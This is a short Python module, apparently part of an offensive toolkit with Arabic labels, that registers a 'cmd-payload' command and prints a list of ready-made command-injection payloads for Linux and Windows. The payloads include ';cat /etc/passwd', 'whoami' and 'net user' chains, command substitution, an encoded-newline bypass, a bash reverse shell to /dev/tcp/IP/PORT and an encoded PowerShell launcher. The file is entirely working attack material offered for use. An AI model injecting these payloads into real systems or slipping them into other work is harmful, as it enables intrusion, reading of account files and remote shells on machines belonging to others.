# cmd-payload.py — توليد حمولات حقن أوامر
from core.registry import module

@module("cmd-payload", "payload", "توليد حمولات أوامر")
def run(base, a, R):
    R.good("حمولات حقن أوامر (Linux/Windows):")
    payloads = [
        ("تأكيد بسيط", ";id"),
        ("Linux", ";cat /etc/passwd"),
        ("Linux", "|whoami"),
        ("Linux", "`id`"),
        ("Linux", "$(id)"),
        ("Windows", "& whoami"),
        ("Windows", "| dir"),
        ("Windows", "&& net user"),
        ("خلخلة", "%0Aid"),
        ("عكسي", ";bash -i >& /dev/tcp/IP/PORT 0>&1"),
        ("عكسي", "powershell -e BASE64"),
    ]
    for name, p in payloads:
        R.info(f"  {name:<18} {p}")
